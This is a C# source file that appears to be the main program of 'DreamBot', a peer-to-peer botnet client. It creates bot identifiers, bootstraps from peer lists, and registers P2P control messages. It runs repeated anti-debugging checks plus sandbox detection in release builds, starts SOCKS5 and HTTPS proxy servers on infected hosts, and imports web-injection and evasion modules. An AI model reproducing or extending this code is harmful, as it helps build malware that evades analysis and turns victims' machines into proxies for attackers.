using System;
using System.Collections.Generic;
using DreamBot.Actions.Socks5;
using DreamBot.Actions.WebInject;
using DreamBot.Network;
using DreamBot.Network.Comunication;
using DreamBot.Network.Comunication.Listeners;
using DreamBot.Network.Listeners;
using DreamBot.Network.Protocol.Handlers;
using DreamBot.Network.Protocol.Messages;
using DreamBot.Network.Protocol.Messages.System;
using DreamBot.Network.Protocol.Peers;
using DreamBot.System;
using DreamBot.System.Evation;
using DreamBot.Workers;
using MessageType = DreamBot.Network.Protocol.Messages.MessageType;

namespace DreamBot
{
    public class DreamBotApp
    {
        private static DreamBotApp _bot;
        public static void Main(string[] args)
        {
            var idbuf = new byte[16];
            new Random().NextBytes(idbuf);

            var id = new BotIdentifier(idbuf);
            var listenPort = 33333;
            var peers = new List<PeerInfo>();

            foreach (var arg in args)
            {
                var v = arg.Substring(1);
                switch (arg[0])
                {
                    case 'p':
                        int.TryParse(v, out listenPort);
                        break;
                    case 'c':
                        foreach (var peerInfo in v.Split(new[]{';'}))
                        {
                            peers.Add(PeerInfo.Parse(peerInfo));
                        }
                        break;
                    case 'i':
                        id = BotIdentifier.Parse(v);
                        break;
                }
            }

#if !DEBUG
            SystemInfo.CheckIfAlreadyRunning(id);
            AntiDebugging.CheckDebugger();
            SandboxDetection.CheckIfSandboxed();
#endif

            _bot = new DreamBotApp(listenPort, id);
            _bot.Bootstrap(peers);
            _bot.Run();
            var c = Console.ReadKey(true);
            while(c.Key != ConsoleKey.Spacebar)
            {
                _bot.Debug(c.Key);
                c = Console.ReadKey(true);
            }
        }

        private void Debug(ConsoleKey key)
        {
            switch (key)
            {
                case ConsoleKey.L:
                    _peerList.Dump();
                    break;
            }
        }

        private readonly ComunicationManager _comunicationManager;
        private readonly PeerManager _peersManager;
        private readonly IMessageListener _listener;
        private readonly IWorkScheduler _worker;
        private readonly PeerList _peerList;
        private readonly ConnectivityTester _connectivityTester;
        private readonly MessageManager _messagesManager;
        private readonly Socks5Server _socks5;
        private readonly HttpsProxyServer _https;
        public static BotIdentifier BotId;
  
        public DreamBotApp(int port, BotIdentifier id)
        {
            BotId = id;
            Logger.Info(0, "DreamBot [id: {0}] listenning on port {1}", BotId, port);

            _worker = new ClientWorker();
            _worker.QueueForever(AntiDebugging.CheckDebugger, TimeSpan.FromSeconds(1));
            _worker.QueueForever(AntiDebugging.CheckDebugging, TimeSpan.FromSeconds(0.3));

            _peerList = new PeerList(_worker);
            _peerList.DesparadoModeActivated += DesperateModeActivated;

            _listener = new MessageListener(port);
            _listener.UdpPacketReceived += EnqueueMessage;

            _comunicationManager = new ComunicationManager(_listener, _worker);
            _peersManager = new PeerManager(_comunicationManager, _peerList, _worker, BotId);
            _messagesManager = new MessageManager(_peersManager);

            _messagesManager.Register(0x00, MessageType.Request,  typeof(HelloMessage), new HelloMessageHandler(_peerList, _messagesManager), false);
            _messagesManager.Register(0x01, MessageType.Reply, typeof(HelloReplyMessage), new HelloReplyMessageHandler(_peerList, _messagesManager), true);
            _messagesManager.Register(0x02, MessageType.Request, typeof(GetPeerListMessage), new GetPeerListMessageHandler(_peerList, _messagesManager), true);
            _messagesManager.Register(0x03, MessageType.Reply, typeof(GetPeerListReplyMessage), new GetPeerListReplyMessageHandler(_peerList, _messagesManager), true);
            _messagesManager.Register(0xFF, MessageType.Special, typeof(InvalidMessage), new InvalidMessageHandler(_peerList), false);

            _socks5 = new Socks5Server(8009);
            _https = new HttpsProxyServer(8019);
            //_connectivityTester = new ConnectivityTester();
            //_connectivityTester.OnConnectivityStatusChanged += OnConnectivityStatusChanged;
        }

        private void DesperateModeActivated(object sender, DesparateModeActivatedEventArgs e)
        {
            Logger.Info(0, "Entering DESPERATE Mode");
            foreach (var bot in e.Bots)
            {
                var hello = new GetPeerListMessage();
                _messagesManager.Send(hello, bot, 0);
            }
        }

        public void Bootstrap(List<PeerInfo> peers)
        {
            Logger.Info(0, "Bootstrapping init.  {0} found endpoints", peers.Count);
            foreach (var peer in peers)
            {
                _peerList.TryRegister(peer);

                var hello = new HelloMessage();
                _messagesManager.Send(hello, peer.BotId, 0);
            }
        }

        public void Run()
        {
            Logger.Info(0,  "Starting DreamBot");
//            _worker.Start();
//            _listener.Start();
            _socks5.Start();
            _https.Start();
            Logger.Info(0, "DreamBot is running ;)");
        }

        private void EnqueueMessage(object sender, UdpPacketReceivedEventArgs e)
        {
            _comunicationManager.Receive(e.EndPoint, e.Data);
        }

        private void OnConnectivityStatusChanged(object sender, EventArgs eventArgs)
        {
            if (_connectivityTester.IsConnected)
                _worker.Start();
            else
                _worker.Stop();
        }
    }
}